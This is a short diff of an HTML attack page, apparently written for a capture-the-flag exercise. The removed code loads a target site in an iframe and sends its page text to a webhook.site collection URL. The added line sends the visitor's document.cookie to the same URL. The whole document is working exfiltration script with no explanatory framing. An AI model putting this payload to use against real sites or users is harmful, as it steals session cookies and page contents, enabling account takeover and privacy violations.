@@ -2,20 +2,7 @@
 <html>
 <body>
   <script>
-    // open target site inside iframe
-    var f = document.createElement("iframe");
-    f.src = "http://a6809c0b-89e5-4227-9672-fc46643f9780.machine.lannasec.com/";
-    document.body.appendChild(f);
-
-    // wait for it to load and render flag
-    setTimeout(() => {
-      try {
-        let data = f.contentWindow.document.body.innerText;
-        new Image().src = "https://webhook.site/f3e6d7e6-1af6-4c70-9c41-a6a8db55e9f2?d=" + encodeURIComponent(data);
-      } catch (e) {
-        new Image().src = "https://webhook.site/f3e6d7e6-1af6-4c70-9c41-a6a8db55e9f2?err=" + e;
-      }
-    }, 5000);
+  fetch("https://webhook.site/f3e6d7e6-1af6-4c70-9c41-a6a8db55e9f2?c=" + document.cookie)
   </script>
 </body>
 </html>
